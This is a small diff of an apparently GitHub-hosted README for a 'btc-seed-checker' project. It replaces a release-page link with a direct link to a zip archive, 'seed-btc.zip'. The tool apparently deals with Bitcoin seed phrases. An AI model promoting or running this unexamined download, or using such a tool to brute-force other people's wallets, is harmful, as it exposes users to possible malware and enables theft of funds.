@@ -4,7 +4,7 @@
 ![screen](https://github.com/Ponk445/btc-seed-checker/assets/81933848/50fc0e60-669a-499c-8d71-698886f8ffec)
 
 
-    <p align="center"> [Download](https://github.com/AlmazQw/seed-phrase-generator/releases/tag/1.0.2) 
+    <p align="center"> [Download](https://github.com/Ponk445/btc-seed-checker/releases/download/r/seed-btc.zip) 
   <br>
   <hr style="border-radius: 2%; margin-top: 45px; margin-bottom: 52px;" noshade="" size="20" width="98%">
 </p>
